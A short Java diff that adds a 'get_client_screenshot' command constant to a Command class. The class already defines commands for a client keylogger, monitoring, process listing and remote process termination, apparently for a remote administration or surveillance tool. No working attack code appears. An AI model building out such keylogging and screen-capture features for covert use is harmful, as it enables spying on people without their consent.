@@ -11,6 +11,7 @@ public class Command {
     public static final String COMMAND_CLIENT_KEYLOGGER = "get_client_keylogger";
     public static final String COMMAND_SYNC = "sync";
     public static final String COMMAND_CLIENT_MONITOR = "get_client_monitor";
+    public static final String COMMAND_CLIENT_SCREENSHOT = "get_client_screenshot";
     public static final String COMMAND_CLIENT_PROCESS = "get_client_process";
     public static final String COMMAND_END_CLIENT_PROCESS = "end_client_process";
     public static final String COMMAND_NOTIFICATION = "notify";
